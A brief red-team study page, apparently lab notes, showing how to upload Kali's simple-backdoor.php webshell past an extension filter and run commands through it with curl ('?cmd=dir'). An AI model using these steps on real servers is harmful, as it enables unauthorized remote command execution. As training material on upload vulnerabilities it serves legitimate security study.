---
title: FileUpload 2
parent: Attack Repository
grand_parent: Red Team
nav_order: 3
---
# Example 2: 
# Uploading a command execution file
1. Based on the results from Example 1, prepare a PHP file for a reverse shell and upload it
```bash
cp /usr/share/webshells/php/simple-backdoor.php ./
# Upload this file
```

2. Execute
```bash
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```
